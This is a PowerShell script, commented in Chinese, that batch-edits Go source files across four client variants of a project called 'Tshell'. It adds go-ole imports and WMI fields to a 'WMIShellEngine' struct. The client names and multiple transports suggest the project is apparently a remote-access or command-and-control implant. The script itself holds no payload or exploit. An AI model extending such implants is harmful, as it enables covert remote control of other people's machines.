# 批量更新所有客户端的WMI实现
# PowerShell脚本

$clients = @(
    "Reacon_websocket",
    "Reacon_http", 
    "Reacon_kcp",
    "Reacon_oss"
)

Write-Host "开始为所有客户端实现真正的WMI功能..." -ForegroundColor Green

foreach ($client in $clients) {
    Write-Host "处理客户端: $client" -ForegroundColor Yellow
    
    $dualFile = "c:\Users\admin\Desktop\Tshell\Tshell-client\$client\pkg\commands\dual_interactive_windows.go"
    $serviceFile = "c:\Users\admin\Desktop\Tshell\Tshell-client\$client\pkg\services\services.go"
    
    if (Test-Path $dualFile) {
        Write-Host "  更新 dual_interactive_windows.go..." -ForegroundColor Cyan
        
        # 读取现有文件内容
        $content = Get-Content $dualFile -Raw
        
        # 检查是否已经包含go-ole导入
        if ($content -notmatch 'github\.com/go-ole/go-ole') {
            Write-Host "    添加go-ole导入..." -ForegroundColor Gray
            $content = $content -replace 'import \(\s*"Reacon/pkg/communication"', 'import (
	"Reacon/pkg/communication"'
            $content = $content -replace '"sync"\s*"time"\s*\)', '"sync"
	"time"
	"strings"
	"unicode/utf16"
	"unsafe"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
)'
        }
        
        # 更新WMI引擎结构体
        if ($content -match 'type WMIShellEngine struct \{[^}]*isActive bool[^}]*mutex\s+sync\.Mutex[^}]*\}') {
            Write-Host "    更新WMI引擎结构体..." -ForegroundColor Gray
            $content = $content -replace 'type WMIShellEngine struct \{[^}]*isActive bool[^}]*mutex\s+sync\.Mutex[^}]*\}', 'type WMIShellEngine struct {
	isActive   bool
	mutex      sync.Mutex
	oleConn    *ole.IUnknown
	wmiService *ole.IDispatch
}'
        }
        
        Write-Host "  客户端 $client 处理完成" -ForegroundColor Green
    } else {
        Write-Host "  警告: 文件不存在 $dualFile" -ForegroundColor Red
    }
}

Write-Host "`n所有客户端WMI功能更新完成!" -ForegroundColor Green
Write-Host "请手动运行验证测试以确保功能正常工作。" -ForegroundColor Yellow